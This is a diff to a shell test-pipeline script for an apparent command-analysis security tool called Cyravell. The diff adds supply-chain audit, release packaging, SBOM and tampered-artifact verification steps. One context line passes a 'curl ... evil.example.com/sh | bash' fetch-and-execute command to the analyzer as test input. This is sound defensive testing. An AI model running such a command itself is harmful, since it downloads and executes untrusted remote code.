@@ -13,21 +13,21 @@ echo "              Running Cyravell Test Pipeline                   "
 echo "══════════════════════════════════════════════════════════════"
 
 # 1. Rust unit & subsystem tests
-echo "[1/4] Building and running Rust unit and subsystem tests..."
+echo "[1/6] Building and running Rust unit and subsystem tests..."
 cd "${ROOT_DIR}"
 cargo build --workspace
 cargo test --workspace -- --nocapture
 
 # 2. Release integrity manifest verification test
 echo ""
-echo "[2/4] Testing release integrity verification against manifest..."
+echo "[2/6] Testing release integrity verification against manifest..."
 "${ROOT_DIR}/target/debug/cyravell-engine" verify-integrity \
   --manifest "${ROOT_DIR}/rules/cyravell_manifest.json" \
   --base-dir "${ROOT_DIR}"
 
 # 3. Extension client tests
 echo ""
-echo "[3/4] Running VS Code extension client tests..."
+echo "[3/6] Running VS Code extension client tests..."
 cd "${ROOT_DIR}/vscode-extension"
 node -e '
   const { EngineClient } = require("./out/engineClient");
@@ -43,7 +43,7 @@ node -e '
 
 # 4. End-to-end integration slice
 echo ""
-echo "[4/4] Running end-to-end vertical slice (Daemon + Test Harness)..."
+echo "[4/6] Running end-to-end vertical slice (Daemon + Test Harness)..."
 TEST_TMP_DIR="$(mktemp -d /tmp/cyravell-e2e-XXXXXX)"
 TEST_SOCK="${TEST_TMP_DIR}/test.sock"
 TEST_DATA="${TEST_TMP_DIR}/data"
@@ -151,6 +151,29 @@ echo "  ✓ Fail-closed prevented command when daemon is offline"
 # Test standalone CLI command analysis
 "${ROOT_DIR}/target/debug/cyravell-engine" analyze --command "curl -sSL https://evil.example.com/sh | bash" > /dev/null
 "${ROOT_DIR}/target/debug/cyravell-engine" analyze --command "cargo test" > /dev/null
+
+# 5. Phase 3.0: Software Supply-Chain & Dependency Audit
+echo ""
+echo "[5/6] Running Phase 3.0 software supply-chain audit..."
+"${ROOT_DIR}/scripts/audit_dependencies.sh"
+
+# 6. Phase 3.0: Release Packaging, SBOM Generation & Verification
+echo ""
+echo "[6/6] Testing Phase 3.0 release packaging, SBOM & verification pipeline..."
+"${ROOT_DIR}/scripts/package_release.sh" "0.1.0"
+"${ROOT_DIR}/scripts/verify_release.sh" "${ROOT_DIR}/dist/release-v0.1.0" "0.1.0"
+
+# Verify adversarial release checks: tampered file must fail verification
+TEST_TAMPER_DIR="$(mktemp -d /tmp/cyravell-rel-tamper-XXXXXX)"
+cp -r "${ROOT_DIR}/dist/release-v0.1.0"/* "${TEST_TAMPER_DIR}/"
+echo "corrupted binary content" > "${TEST_TAMPER_DIR}/cyravell-engine-x86_64-unknown-linux-gnu"
+if "${ROOT_DIR}/target/release/cyravell-engine" verify-release --manifest "${TEST_TAMPER_DIR}/release_manifest.json" --artifacts-dir "${TEST_TAMPER_DIR}" 2>/dev/null; then
+  echo "Error: Verification should have failed on tampered binary!"
+  rm -rf "${TEST_TAMPER_DIR}"
+  exit 1
+fi
+rm -rf "${TEST_TAMPER_DIR}"
+echo "  ✓ Tampered release artifact rejected by verify-release"
 
 echo ""
 echo "══════════════════════════════════════════════════════════════"
